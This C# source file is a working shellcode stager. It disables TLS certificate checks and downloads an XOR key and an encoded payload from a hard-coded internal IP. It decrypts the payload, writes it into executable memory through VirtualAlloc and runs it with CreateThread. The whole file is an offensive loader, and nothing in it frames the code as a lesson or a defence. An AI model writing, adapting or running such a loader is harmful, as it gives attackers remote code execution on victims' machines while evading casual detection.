using System;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class Program {
  [DllImport("kernel32")]
  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

  [DllImport("kernel32")]
  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

  [DllImport("kernel32")]
  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  private static UInt32 MEM_COMMIT = 0x1000;
  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

  public static void Main()
  {
    string url = "https://10.9.144.254/";
    Stager(url);
  }

  public static void Stager(string url)
  {

    WebClient wc = new WebClient();
    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

    //byte[] shellcode = wc.DownloadData(url);
    string key = wc.DownloadString(url + "mykey").Trim();
    byte[] keyBytes = Encoding.ASCII.GetBytes(key);

    string sbuf = wc.DownloadString(url + "shellcode");
    var buf = System.Convert.FromBase64String(sbuf);

    byte[] shellcode = xor(buf, keyBytes);

    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);

  }

  private static byte[] xor(byte[] shell, byte[] KeyBytes)
  {
      for (int i = 0; i < shell.Length; i++)
      {
          shell[i] ^= KeyBytes[i % KeyBytes.Length];
      }
      return shell;
  }
}